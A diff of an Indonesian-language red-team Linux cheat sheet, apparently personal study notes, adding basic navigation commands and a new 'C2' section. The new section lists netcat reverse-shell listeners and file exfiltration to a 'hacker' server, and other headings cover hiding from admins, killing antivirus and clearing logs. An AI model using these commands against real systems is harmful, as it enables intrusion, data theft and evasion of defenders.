@@ -2,15 +2,32 @@
 
 **Author:** Adrian
 
-**Scope:** Day 1 - Day 4 (Permissions, PrivEsc, Processes, Weaponization)
+**Scope:** Day 1 - Day 5 (Basics, Permissions, PrivEsc, Processes, Weaponization, Networking)
 
-**Version:** 1.0
+**Version:** 2.0
 
 **Status:** Active Document
 
 ---
 
-## 1. Identity & Access Management (Reconnaissance)
+## 1. File System & Navigation (The Foundation)
+*Fokus: Bergerak cepat di dalam terminal tanpa mouse.*
+
+| Command | Deskripsi |
+| :--- | :--- |
+| **`pwd`** | **Print Working Directory**. Kita sedang ada di folder mana? |
+| **`ls -la`** | Melihat daftar file termasuk yang tersembunyi (dotfiles) dan izin aksesnya. |
+| **`cd <folder>`** | Masuk ke folder. Gunakan `cd ..` untuk mundur, `cd ~` untuk pulang ke home. |
+| **`mkdir <nama>`** | Membuat folder baru. |
+| **`touch <nama>`** | Membuat file kosong. |
+| **`cp <sumber> <tujuan>`** | Copy file. Gunakan `cp -r` untuk copy folder. |
+| **`mv <sumber> <tujuan>`** | Move (pindah) atau Rename (ganti nama) file. |
+| **`cat <file>`** | Membaca isi file sampai habis. |
+| **`nano <file>`** | Text editor CLI untuk mengedit script atau konfigurasi. |
+
+---
+
+## 2. Identity & Access Management (Reconnaissance)
 *Fokus: Mengetahui siapa kita, di mana kita, dan apa yang bisa kita lakukan.*
 
 | Command | Deskripsi & Fungsi Red Team |
@@ -25,7 +42,7 @@
 
 ---
 
-## 2. Permission Manipulation & File Attributes
+## 3. Permission Manipulation & File Attributes
 *Fokus: Mengontrol akses file dan memodifikasi hak eksekusi.*
 
 | Command | Deskripsi |
@@ -38,7 +55,7 @@
 
 ---
 
-## 3. Privilege Escalation (SUID)
+## 4. Privilege Escalation (SUID)
 *Fokus: Mencari celah untuk naik dari User Biasa -> Root.*
 
 | Command | Deskripsi & Fungsi Red Team |
@@ -50,7 +67,7 @@
 
 ---
 
-## 4. Process Management & Stealth
+## 5. Process Management & Stealth
 *Fokus: Sembunyi dari Sysadmin dan menghentikan Antivirus/Defense.*
 
 | Command | Deskripsi |
@@ -65,7 +82,7 @@
 
 ---
 
-## 5. Weaponization (Compiling & Package Mgmt)
+## 6. Weaponization (Compiling & Package Mgmt)
 *Fokus: Menyiapkan alat tempur langsung di server target (Living off the Land).*
 
 | Command | Deskripsi & Fungsi Red Team |
@@ -80,7 +97,23 @@
 
 ---
 
-## 6. OpSec (Operational Security & Cleanup)
+## 7. Networking & Command Control (C2) - NEW!
+*Fokus: Konektivitas, Reverse Shell, dan Data Exfiltration.*
+
+| Command | Deskripsi & Fungsi Red Team |
+| :--- | :--- |
+| **`ip addr`** | Cek IP Address sendiri (Penting untuk setting LHOST pada payload). |
+| **`ss -antp`** | Cek port yang sedang **Listening**. Cari layanan yang terbuka atau backdoor kita. |
+| **`ping -c 4 <ip>`** | Cek koneksi internet atau koneksi ke target. |
+| **`nc -lvnp <port>`** | **Netcat Listener**. Membuka port untuk menunggu koneksi (Reverse Shell Handler). |
+| **`nc <ip> <port>`** | **Netcat Connect**. Menghubungi server lain (Simulasi Victim connect ke Hacker). |
+| **`nc -lvnp 4444 > file`** | **Data Exfil (Receiver)**. Menunggu file dikirim dan menyimpannya. |
+| **`nc <ip> 4444 < file`** | **Data Exfil (Sender)**. Mengirim isi file ke server hacker. |
+| **`cat /etc/resolv.conf`** | Cek konfigurasi DNS (Jika koneksi internet gagal). |
+
+---
+
+## 8. OpSec (Operational Security & Cleanup)
 *Fokus: Jangan tinggalkan jejak.*
 
 | Command | Deskripsi |
@@ -98,3 +131,4 @@
 1.  **Check Before You Wreck:** Selalu gunakan `ls -l` atau `id` sebelum menjalankan exploit. Pastikan kamu tahu posisimu.
 2.  **Living off the Land:** Jangan memaksakan install tools baru jika server target sudah punya `gcc`, `python`, atau `perl`. Gunakan apa yang ada agar tidak terdeteksi.
 3.  **Clean As You Go:** Selesai meretas? Hapus `exploit.c`, hapus binary `exploit`, dan bersihkan log. Hantu tidak meninggalkan jejak.
+4.  **Listen First:** Saat melakukan *Data Exfiltration* atau *Reverse Shell*, nyalakan **Listener** (`nc -lvnp`) terlebih dahulu sebelum mengeksekusi payload di sisi korban.
